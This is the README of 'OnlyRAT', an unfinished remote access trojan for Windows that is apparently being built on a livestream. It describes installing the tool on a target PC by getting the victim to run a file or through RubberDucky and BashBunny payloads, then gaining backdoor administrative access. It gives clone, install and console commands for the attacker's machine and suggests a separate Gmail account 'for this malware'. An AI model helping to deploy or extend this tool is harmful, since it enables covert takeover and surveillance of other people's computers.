# OnlyRAT [INCOMPLETE]
> Blue Cosmo | 01/07/2022
---

```
     ::::::::  ::::    ::: :::     :::   ::: :::::::::      ::: ::::::::::: 
    :+:    :+: :+:+:   :+: :+:     :+:   :+: :+:    :+:   :+: :+:   :+:      
   +:+    +:+ :+:+:+  +:+ +:+      +:+ +:+  +:+    +:+  +:+   +:+  +:+       
  +#+    +:+ +#+ +:+ +#+ +#+       +#++:   +#++:++#:  +#++:++#++: +#+        
 +#+    +#+ +#+  +#+#+# +#+        +#+    +#+    +#+ +#+     +#+ +#+         
#+#    #+# #+#   #+#+# #+#        #+#    #+#    #+# #+#     #+# #+#          
########  ###    #### ########## ###    ###    ### ###     ### ###          
```

## [!!] DISCLAIMER
We are currently building this RAT on stream, **so it is not done**. But feel free to hop in and join us on this adventure of building this RAT.

## Overview:
OnlyRAT [Only Remote Access Tool] is the *only RAT* you'll ever need. We will be able to use this tool to remotely command and control windows computers. 

The RAT has a multitude of ways of how it can be installed on to a target pc. Whether it is getting them to run a file all the way to RubberDucky and BashBunny payloads.

Once installed we will have remote administrative access to our target. We can connect to our target through our Python console on our attacker pc. The onlyrat console has plenty of payloads we can then use on our target or we can simply enjoy our backdoor access. Enjoy!

## Resources:
- [YouTube Video]()
- [YouTube Channel](https://youtube.com/cosmodiumcs)
- [Website](https://cosmodiumcs.com)

## Requirements:
**Attacker PC**
- Security Linux [Debian Based]
    - Kali Linux
    - Parrot OS
- Python3
- SSH
- Gmail account
    - i suggest making a separate Gmail account for this malware
    - your Gmail must have [LSA Access](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4Px2VEFPoFPEuLutMD6UhNVRyY9P3s7l-pCGA53NBqilKVrtltrfS1823x5i6k6_pSEVp6jkEW0zKQT2CHN0WXh4fvGiw) enabled

**Target PC**
- Windows 10 privileged user

## Instructions:
**Target Installation**
- The [installers](https://github.com/CosmodiumCS/OnlyRAT/tree/main/installers) folder contains all the ways we can install the RAT on to our target

**Attacker Installation**
- install only rat by cloning this repository
```bash
git clone https://github.com/CosmodiumCS/OnlyRAT.git
```
- install dependencies for OnlyRAT
```bash
chmod +x install.sh
./install.sh
```

**Attacker Console**
- Run `onlyrat` in your terminal for help
```bash
onlyrat
```
- Append target IP Address
```bash
onlyrat -t 192.168.1.50
```
- Append configuraiton file
```bash
onlyrat -f bluecosmo.rat
```

## Extraneous:

